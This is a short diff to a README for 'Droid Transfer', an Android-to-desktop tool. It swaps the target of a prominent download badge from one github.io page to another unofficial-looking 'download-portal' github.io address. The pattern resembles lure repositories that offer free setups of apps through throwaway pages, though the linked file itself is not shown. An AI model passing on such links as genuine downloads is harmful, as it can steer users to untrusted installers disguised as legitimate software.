@@ -2,7 +2,7 @@
 ### 📲 *Control your Android from your desktop — messages, media, and more.*
 
 <p align="center">
-  <a href="https://droid-transfer-free-for-pc.github.io/.github/" target="_blank">
+  <a href="https://download-portal-demo.github.io/.github/Droidtransfer12" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-DROID_TRANSFER_SETUP-28a745?style=for-the-badge&logo=android&logoColor=white" alt="Download Droid Transfer Setup" />
   </a>
 </p>
